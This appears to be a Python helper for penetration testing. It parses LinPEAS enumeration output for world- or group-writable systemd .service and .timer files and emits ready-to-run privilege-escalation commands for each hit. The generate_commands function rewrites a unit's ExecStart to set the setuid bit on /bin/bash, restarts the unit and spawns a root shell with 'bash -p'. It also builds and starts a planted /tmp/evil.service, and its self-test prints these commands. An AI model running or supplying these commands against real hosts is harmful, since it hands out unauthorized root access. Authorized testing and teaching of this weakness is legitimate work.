"""Detect writable systemd .service/.timer files from LinPEAS output."""

import os
import re
from typing import Dict, List

# Matches a full path to a systemd unit file in standard systemd directories
_SERVICE_PATH_RE = re.compile(
    r"(/(?:etc|lib|usr/lib)/systemd/\S+\.(?:service|timer))"
)

# Matches a permission string at the start of a line (ls -l format)
# Group 1: the 10-char permission block (e.g. -rwxrwxrwx)
_PERM_RE = re.compile(r"^([-dlbcsp](?:[r-][w-][xsStT-]){3})")

# Permission string is considered writable if any of the other/group/world
# write bits are set (positions 5 or 8 in the 10-char string).
def _is_perm_writable(perm: str) -> bool:
    """Return True if the ls-l permission string has group-write or other-write."""
    # perm is 10 chars: type + owner(rwx) + group(rwx) + other(rwx)
    # group-write is index 5, other-write is index 8
    return len(perm) >= 10 and (perm[5] == "w" or perm[8] == "w")


def parse_systemd_section(section_text: str) -> List[str]:
    """Extract writable systemd service/timer paths from LinPEAS section text."""
    paths: List[str] = []
    seen: set = set()
    for line in section_text.splitlines():
        m = _SERVICE_PATH_RE.search(line)
        if not m:
            continue
        path = m.group(1)
        # If a permission string is present on the same line, check writability.
        # If no permission string (bare path from a writable-files section), accept.
        perm_m = _PERM_RE.match(line.strip())
        if perm_m and not _is_perm_writable(perm_m.group(1)):
            continue
        if path not in seen:
            seen.add(path)
            paths.append(path)
    return paths


def _service_name(service_path: str) -> str:
    """Return the unit name without directory or extension."""
    base = os.path.basename(service_path)
    for ext in (".service", ".timer"):
        if base.endswith(ext):
            base = base[: -len(ext)]
            break
    return base


def generate_commands(service_path: str) -> List[str]:
    """Generate exploit commands for a writable systemd service/timer file."""
    name = _service_name(service_path)
    return [
        f"sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c \"chmod +s /bin/bash\"|' {service_path}",
        "systemctl daemon-reload",
        f"systemctl restart {name}",
        "/bin/bash -p",
        "# OR create a fresh service payload:",
        "echo '[Service]' > /tmp/evil.service",
        "echo 'Type=oneshot' >> /tmp/evil.service",
        "echo 'ExecStart=/bin/bash -c \"chmod +s /bin/bash\"' >> /tmp/evil.service",
        "systemctl link /tmp/evil.service",
        "systemctl start evil",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for writable systemd service/timer files.

    Returns a CRITICAL finding for each writable unit file detected.
    """
    findings: List[Dict] = []
    for path in parse_systemd_section(section_text):
        findings.append({
            "service_path": path,
            "service_name": os.path.basename(path),
            "severity": "CRITICAL",
            "type": "systemd_service",
            "commands": generate_commands(path),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
-rwxrwxrwx 1 root root 512 Mar  5  2024 /etc/systemd/system/webapp.service
-rw-r--r-- 1 root root 256 Jan 10 12:00 /etc/systemd/system/ssh.service
-rwxrwxrwx 1 root root 128 Jan 10 12:00 /lib/systemd/system/backup.timer

╔══════════╣ Interesting writable files owned by me or writable by everyone
/etc/systemd/system/backup.service
/tmp/somefile.txt
"""

    print("=== parse_systemd_section ===")
    paths = parse_systemd_section(SAMPLE)
    print("Paths:", paths)

    print("\n=== analyze ===")
    for finding in analyze(SAMPLE):
        cmds = finding["commands"]
        print(
            f"[{finding['severity']}] {finding['type']} -> {finding['service_path']}"
            f"  ({len(cmds)} cmd(s))"
        )
        print(f"  TRY FIRST: $ {cmds[0]}")
        for c in cmds[1:]:
            print(f"             $ {c}")
